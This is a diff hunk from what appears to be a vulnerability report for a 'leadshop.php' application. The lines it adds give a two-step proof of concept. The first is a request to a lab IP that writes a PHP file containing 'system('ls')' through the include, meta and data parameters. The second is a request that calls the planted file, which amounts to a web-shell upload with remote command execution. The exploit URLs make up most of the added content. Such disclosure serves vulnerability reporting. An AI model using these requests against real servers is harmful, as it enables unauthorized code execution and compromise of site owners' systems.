@@ -67,6 +67,15 @@ http://example.org/leadshop.php?include=ToMkdir&meta=orobos.php&data=1
 file picture:  
 ![img](tomkdir.PNG)
 
+step 1:
+```
+http://192.168.24.129/leadshop.php?include=ToMkdir&meta=/web/orobos.php&data=%3C?php%20system(%27ls%27)%20?%3E
+```
+step 2:
+```
+http://192.168.24.129/orobos.php
+```
+![img](upload_trojans.PNG)
 -
 Impact
 -
